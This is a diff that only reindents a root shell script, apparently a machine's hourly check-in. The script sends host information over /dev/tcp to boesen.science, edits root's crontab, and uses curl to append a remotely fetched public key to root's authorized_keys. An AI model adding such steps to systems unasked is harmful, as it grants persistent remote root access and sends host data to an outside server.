@@ -3,9 +3,9 @@ host=boesen.science
 
 # Prevent from running twice per hour
 if [[ $(< /tmp/last) = $(date +"%H") ]]; then
-	exit 1
+    exit 1
 else
-	date +"%H" > /tmp/last
+    date +"%H" > /tmp/last
 fi
 
 hostname=$(hostname)
@@ -19,9 +19,9 @@ port=2043
 rm /tmp/ip
 
 if [[ $(< /etc/info) != "$info" ]]; then
-	printf "$info" > /etc/info
+    printf "$info" > /etc/info
 
-	printf "UPDATE: $info" >/dev/tcp/$host/$port
+    printf "UPDATE: $info" >/dev/tcp/$host/$port
 fi
 
 grep -v "$host" /var/spool/cron/crontabs/root > /tmp/crontab; mv /tmp/crontab /var/spool/cron/crontabs/root
@@ -37,5 +37,5 @@ sshpath="/root/.ssh"
 mkdir -p "$sshpath"
 
 if ! grep boesene $sshpath/authorized_keys; then
-	curl -L $host:2042/pubkey >> $sshpath/authorized_keys
+    curl -L $host:2042/pubkey >> $sshpath/authorized_keys
 fi
